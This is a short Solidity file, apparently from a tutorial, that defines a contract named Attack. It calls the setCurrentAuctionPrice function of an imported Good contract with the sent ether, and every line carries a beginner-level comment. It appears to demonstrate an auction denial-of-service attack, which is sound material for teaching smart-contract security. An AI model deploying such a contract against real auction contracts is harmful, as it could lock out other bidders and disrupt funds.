// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Good.sol";

// contract Attack is the name of the smart contract
contract Attack {
// good is a variable of type Good
Good good;
// constructor is called once when the contract is deployed
constructor(address _good) {
    // _good is the address of the Good contract
    // good is set to the Good contract at the address _good
    good = Good(_good);
}

// function attack is public and payable
function attack() public payable {
    // calls the setCurrentAuctionPrice function of the good contract with the value of msg.value
    good.setCurrentAuctionPrice{value: msg.value}();
}
}